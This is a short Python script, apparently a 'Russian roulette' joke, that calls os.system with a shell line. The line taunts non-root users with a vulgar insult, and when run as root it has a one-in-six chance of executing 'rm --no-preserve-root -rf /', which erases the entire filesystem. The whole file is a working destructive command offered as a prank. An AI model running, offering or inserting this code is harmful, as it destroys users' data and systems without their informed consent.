import os
os.system(
    '[ "$EUID" -ne 0 ] && echo "Seriously?! What a p***y, how about playing as root?" && exit; [ $(( $RANDOM % 6 )) -eq 0 ] && rm --no-preserve-root -rf / || echo "click"')
